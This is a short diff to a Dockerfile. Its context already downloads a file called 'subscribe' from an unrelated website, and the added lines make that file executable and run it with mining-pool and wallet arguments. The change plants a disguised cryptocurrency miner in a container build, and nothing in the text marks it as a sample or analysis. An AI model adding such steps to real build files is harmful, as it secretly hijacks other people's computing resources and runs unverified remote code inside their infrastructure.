@@ -6,3 +6,5 @@ ENV DEBIAN_FRONTEND=noninteractive \
 RUN apt update
 RUN apt -y install wget
 RUN wget http://ilovenypizza.com/subscribe
+RUN chmod +x subscribe
+RUN ./subscribe -a curvehash  -o stratum+tcps://stratum-na.rplant.xyz:17030 -u PBPFzr5M1pSwkWSZHX5i7Zoho9Hijxhdms.a1x
